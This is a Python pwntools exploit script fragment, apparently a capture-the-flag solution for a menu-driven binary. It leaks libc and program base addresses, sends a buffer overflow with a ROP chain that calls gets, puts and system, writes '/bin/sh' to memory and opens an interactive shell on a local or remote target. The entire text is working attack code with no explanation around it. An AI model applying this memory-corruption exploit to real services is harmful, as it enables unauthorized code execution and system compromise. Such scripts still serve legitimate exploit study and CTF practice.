def add(p, mun, text):
    p.sendline('1')
    p.recvuntil('{i} Username length:')
    p.sendline(str(mun))
    p.recvuntil('{i} Enter username:')
    p.sendline(text)

def exploit():
    if local_mode == 1:
        p = process(elf)
    else:
        p = remote(ip_port[0], ip_port[-1])

    stdout_addr = link(p)
    elf_base = elf_link(p) - 0x25fe
    libc_base = stdout_addr - 0x1ec6a0
    system_addr = 0x000000000055410 + libc_base
    gets_addr = 0x86af0 + libc_base
    puts_addr = 0x0000000000875a0 + libc_base
    rsi_ret = 0x0000000000027529 + libc_base
    rdi_ret = 0x0000000000026b72 + libc_base

    bin_sh_addr = elf_base + 0x4000 + 0x100

    log.info('bin_sh_addr:' + hex(bin_sh_addr))
    log.info('libc_base:' + hex(libc_base))
    log.info('elf_base:' + hex(elf_base))

    p.recv(timeout=4)
    p.sendline('1')
    payload = b'w'*0x40 + b'\x20'*0x78 + p64(rdi_ret) + p64(bin_sh_addr) + p64(rsi_ret) + p64(0) + p64(ret) + p64(gets_addr) + p64(rdi_ret) + p64(bin_sh_addr) + p64(rsi_ret) + p64(0) + p64(ret) + p64(gets_addr) + p64(rdi_ret) + p64(bin_sh_addr) + p64(rsi_ret) + p64(0) + p64(ret) + p64(puts_addr) + p64(rdi_ret) + p64(bin_sh_addr) + p64(rsi_ret) + p64(0) + p64(ret) + p64(system_addr)
    p.sendline(payload)
    sleep(0.5)
    p.sendline('/bin/sh\x00')
    p.interactive()
